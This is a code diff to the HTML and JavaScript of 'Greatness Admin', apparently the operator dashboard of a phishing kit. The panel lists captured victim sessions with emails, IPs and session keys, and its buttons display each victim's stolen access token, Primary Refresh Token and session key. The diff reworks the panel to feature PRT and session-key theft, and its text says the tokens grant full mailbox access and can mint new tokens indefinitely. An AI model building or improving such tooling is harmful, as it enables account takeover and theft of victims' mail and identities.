@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Greatness Admin - Token Manager</title>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: #0a0e27; color: #e0e0e0; padding: 20px; }
@@ -18,35 +17,36 @@
         .tools-section { background: #111635; border-radius: 16px; padding: 20px; margin-bottom: 30px; }
         .tools-grid { display: flex; gap: 15px; flex-wrap: wrap; }
         .tool-btn { background: linear-gradient(135deg, #1a1f3e, #111635); border: 1px solid #2a2f4e; padding: 10px 20px; border-radius: 10px; color: white; cursor: pointer; }
-        .tool-btn:hover { background: #3b82f6; border-color: #3b82f6; }
+        .tool-btn:hover { background: #3b82f6; }
         .table-container { background: #111635; border-radius: 16px; padding: 20px; overflow-x: auto; }
         table { width: 100%; border-collapse: collapse; }
         th, td { text-align: left; padding: 12px 8px; border-bottom: 1px solid #1e2342; }
         th { color: #8b8fbf; font-size: 12px; }
         td { font-size: 12px; }
-        .view-token-btn, .view-refresh-btn { background: #10b981; border: none; padding: 4px 10px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; margin: 2px; }
-        .view-refresh-btn { background: #f59e0b; }
-        .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 700px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; max-height: 80vh; overflow-y: auto; }
+        .btn-view { background: #10b981; border: none; padding: 4px 10px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; margin: 2px; }
+        .btn-prt { background: #f59e0b; }
+        .btn-session { background: #8b5cf6; }
+        .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 750px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; max-height: 80vh; overflow-y: auto; }
         .token-modal pre { background: #0a0e27; padding: 12px; border-radius: 8px; overflow-x: auto; font-size: 10px; word-break: break-all; white-space: pre-wrap; }
         .overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; }
         .badge { background: #1e3a5f; padding: 4px 12px; border-radius: 20px; font-size: 11px; }
         .loading { text-align: center; padding: 40px; color: #6b7280; }
         .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #374151; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .has-refresh { color: #10b981; font-size: 10px; }
-        .no-refresh { color: #ef4444; font-size: 10px; }
+        .has-prt { color: #10b981; font-size: 10px; }
+        .session-key { font-family: monospace; font-size: 10px; background: #1f2937; padding: 2px 4px; border-radius: 4px; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <div class="logo"><h1>Greatness Admin</h1><p>Token & Session Manager</p></div>
+        <div class="logo"><h1>Greatness Admin</h1><p>PRT & Session Manager</p></div>
         <div class="badge" id="sessionCount">0 Sessions</div>
     </div>
 
     <div class="stats-grid">
         <div class="stat-card"><div class="stat-title">Total Sessions</div><div class="stat-value" id="totalSessions">0</div></div>
-        <div class="stat-card"><div class="stat-title">With Refresh Token</div><div class="stat-value" id="withRefresh">0</div></div>
+        <div class="stat-card"><div class="stat-title">With PRT</div><div class="stat-value" id="withPRT">0</div></div>
         <div class="stat-card"><div class="stat-title">Active Tokens</div><div class="stat-value" id="activeTokens">0</div></div>
         <div class="stat-card"><div class="stat-title">Last Capture</div><div class="stat-value" id="lastCapture" style="font-size: 14px;">-</div></div>
     </div>
@@ -61,10 +61,10 @@
     </div>
 
     <div class="table-container">
-        <h3>📋 Captured Sessions & Tokens</h3>
+        <h3>📋 Captured Sessions - PRT & Session Keys</h3>
         <table>
             <thead>
-                <tr><th>Email</th><th>IP</th><th>User Agent</th><th>Refresh Token</th><th>Captured</th><th>Tokens</th></tr>
+                <tr><th>Email</th><th>IP</th><th>Session Key</th><th>PRT Status</th><th>Captured</th><th>Actions</th></tr>
             </thead>
             <tbody id="sessionsTableBody"><tr><td colspan="6" class="loading"><div class="spinner"></div> Loading...</td></tr></tbody>
         </table>
@@ -107,20 +107,13 @@
             <tr>
                 <td style="color:#60a5fa; font-weight:500;">${escapeHtml(s.email)}</td>
                 <td><code>${escapeHtml(s.ip || 'Unknown')}</code></td>
-                <td style="max-width:200px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="${escapeHtml(s.userAgent)}">
-                    ${escapeHtml((s.userAgent || 'Unknown').substring(0, 40))}...
-                </td>
-                <td>
-                    ${s.hasRefreshToken ? 
-                        `<span class="has-refresh">✅ Has PRT</span>
-                         <button class="view-refresh-btn" onclick="viewTokens('${s.sid}', 'refresh')">View PRT</button>` : 
-                        `<span class="no-refresh">❌ No PRT</span>`
-                    }
-                </td>
+                <td><code class="session-key" title="${escapeHtml(s.sessionKey)}">${escapeHtml(s.sessionKey?.substring(0, 16) || 'N/A')}...</code></td>
+                <td>${s.hasRefreshToken ? '<span class="has-prt">✅ PRT Captured</span>' : '<span style="color:#ef4444;">❌ No PRT</span>'}</td>
                 <td>${formatDate(s.capturedAt)}<br><small>Exp: ${s.tokenExpires || 'N/A'}</small></td>
                 <td>
-                    <button class="view-token-btn" onclick="viewTokens('${s.sid}', 'access')">🔑 Access Token</button>
-                    ${s.hasRefreshToken ? `<button class="view-refresh-btn" onclick="viewTokens('${s.sid}', 'refresh')">🔄 Refresh Token</button>` : ''}
+                    <button class="btn-view" onclick="viewTokens('${s.sid}', 'access')">🔑 Access Token</button>
+                    ${s.hasRefreshToken ? `<button class="btn-view btn-prt" onclick="viewTokens('${s.sid}', 'prt')">🔄 PRT</button>` : ''}
+                    <button class="btn-view btn-session" onclick="viewTokens('${s.sid}', 'session')">🔐 Session Key</button>
                 </td>
             </tr>
         `).join('');
@@ -129,30 +122,45 @@
     async function viewTokens(sid, type) {
         document.getElementById('tokenModal').style.display = 'block';
         document.getElementById('overlay').style.display = 'block';
-        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Loading tokens...</div>';
+        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Loading...</div>';
         
         const data = await apiCall(`/api/session/tokens/${sid}`);
         if (data) {
-            let title = type === 'access' ? '🔐 Access Token' : '🔄 Refresh Token (PRT)';
-            let token = type === 'access' ? data.access_token : data.refresh_token;
-            document.getElementById('modalTitle').innerHTML = `${title} for ${data.email}`;
-            document.getElementById('tokenDetails').innerHTML = `
-                <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                <p><strong>Token Type:</strong> ${data.token_type || 'Bearer'}</p>
-                <p><strong>Expires:</strong> ${new Date(data.expires_at).toLocaleString()}</p>
-                <p><strong>${title}:</strong></p>
-                <pre>${escapeHtml(token || 'Not available')}</pre>
-                <p style="font-size: 11px; color: #8b8fbf; margin-top: 10px;">⚠️ Keep this secure. This provides full access to the user's mailbox.</p>
-            `;
+            let title = '';
+            let content = '';
+            
+            if (type === 'access') {
+                title = '🔐 Access Token';
+                content = `<p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
+                          <p><strong>Token Type:</strong> ${data.token_type || 'Bearer'}</p>
+                          <p><strong>Expires:</strong> ${new Date(data.expires_at).toLocaleString()}</p>
+                          <p><strong>Access Token:</strong></p>
+                          <pre>${escapeHtml(data.access_token)}</pre>`;
+            } else if (type === 'prt') {
+                title = '🔄 Primary Refresh Token (PRT)';
+                content = `<p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
+                          <p><strong>PRT (Refresh Token):</strong></p>
+                          <pre>${escapeHtml(data.refresh_token)}</pre>
+                          <p style="font-size: 11px; color: #f59e0b;">⚠️ This token can be used to generate new access tokens indefinitely.</p>`;
+            } else if (type === 'session') {
+                title = '🔐 Session Key';
+                content = `<p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
+                          <p><strong>Session Key:</strong></p>
+                          <pre>${escapeHtml(data.sessionKey)}</pre>
+                          <p style="font-size: 11px; color: #8b5cf6;">🔑 This key uniquely identifies this session.</p>`;
+            }
+            
+            document.getElementById('modalTitle').innerHTML = title;
+            document.getElementById('tokenDetails').innerHTML = content;
         } else {
-            document.getElementById('tokenDetails').innerHTML = '<p style="color:#ef4444;">❌ Failed to load tokens. Session may have expired.</p>';
+            document.getElementById('tokenDetails').innerHTML = '<p style="color:#ef4444;">❌ Failed to load tokens.</p>';
         }
     }
 
     function updateStats(sessions) {
         document.getElementById('totalSessions').innerText = sessions.length;
-        const withRefresh = sessions.filter(s => s.hasRefreshToken).length;
-        document.getElementById('withRefresh').innerText = withRefresh;
+        const withPRT = sessions.filter(s => s.hasRefreshToken).length;
+        document.getElementById('withPRT').innerText = withPRT;
         document.getElementById('activeTokens').innerText = sessions.length;
         if (sessions.length > 0) document.getElementById('lastCapture').innerHTML = formatDate(sessions[0].capturedAt);
     }
